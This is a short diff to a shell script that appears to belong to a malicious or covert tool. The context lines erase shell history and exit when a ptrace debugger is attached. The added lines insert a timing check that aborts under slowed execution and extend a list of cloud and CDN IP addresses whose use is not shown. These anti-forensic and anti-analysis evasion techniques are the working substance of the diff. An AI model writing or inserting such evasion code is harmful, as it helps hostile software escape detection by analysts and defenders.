@@ -3,6 +3,19 @@ export HISTFILE=/dev/null
 unset HISTFILE
 unset HISTSIZE
 unset HISTFILESIZE
+max_delay=1000000000
+for attempt in {1..3}; do
+    start=$(date +%s%N)
+    for i in {1..100000}; do
+        :  
+    done
+    end=$(date +%s%N)
+    elapsed=$((end - start))
+    if (( elapsed > max_delay )); then
+        echo "[!] Execution delay detected"
+        exit 1
+    fi
+done
 ptrace_check=$(grep TracerPid /proc/$$/status | awk "{print \$2}")    
 if [ "$ptrace_check" != "0" ]; then    
     echo "[!] Traced via ptrace. Exiting..."    
@@ -638,7 +651,8 @@ IP_LIST=(
   "3.167.116.80" "3.162.104.26" "3.167.42.35" "13.35.33.111" "172.253.62.94" "13.35.185.30" "54.239.153.223"
   "3.162.115.183" "23.33.126.185" "18.67.66.159" "23.49.104.204" "23.49.104.169" "23.33.184.243"
   "23.33.126.163" "13.35.185.99" "23.33.184.252" "23.202.34.146" "142.251.163.94" "23.2.16.89"
-  "23.219.172.106" "23.2.16.99" "54.230.129.100" "142.251.179.94"
+  "23.219.172.106" "23.2.16.99" "54.230.129.100" "142.251.179.94" "3.163.198.41" "23.202.35.203"
+  "23.202.34.112"
 )
 spinner="/-\|"
 i=0
